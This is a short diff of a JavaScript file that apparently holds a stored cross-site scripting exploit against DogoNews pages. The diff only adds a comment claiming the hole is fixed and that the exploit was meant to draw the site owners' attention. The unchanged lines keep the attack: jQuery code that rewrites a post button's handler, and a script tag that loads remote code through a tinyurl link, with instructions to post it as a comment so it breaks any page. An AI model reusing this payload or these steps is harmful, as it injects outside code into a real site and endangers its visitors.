@@ -12,6 +12,11 @@ $('input[value$=Post]').first().attr('type','button').attr('onclick','var k=$(\'
   console.log("XSS @ComputerCandyYT on Twitter")
 }
 /*
+-- ATTENTION --
+This XSS Exploitaton has been fixed.
+This was never intended to be used as a Javascript Backdoor.
+This was instead intended to get the attention of DogoMedia as they did not have a contact email address or a bug tracker.
+
 Breaks Any DogoNews page:
 <script src="https://tinyurl.com/j39dsb4" class="xss">run()</script>
 Just comment it with a message after and watch the magic!
